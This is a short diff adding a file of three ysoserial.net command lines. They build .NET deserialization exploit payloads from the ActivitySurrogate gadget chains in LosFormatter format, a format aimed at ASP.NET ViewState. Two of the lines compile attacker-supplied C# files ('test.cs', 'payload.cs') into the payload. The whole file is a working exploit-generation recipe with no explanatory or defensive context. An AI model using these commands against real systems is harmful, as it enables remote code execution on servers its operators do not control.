@@ -1,0 +1,4 @@
+ysoserial-1.34\Release\ysoserial.exe -g ActivitySurrogateDisableTypeCheck -f LosFormatter -c "ignored" > out_disable.txt
+ysoserial-1.34\Release\ysoserial.exe -g ActivitySurrogateSelectorFromFile -f LosFormatter -c "test.cs;System.dll;System.Web.dll;" > out.txt
+ysoserial-1.34\Release\ysoserial.exe -g ActivitySurrogateSelectorFromFile -f LosFormatter -c "payload.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll;Microsoft.AspNet.FriendlyUrls.dll;" > out.txt
+
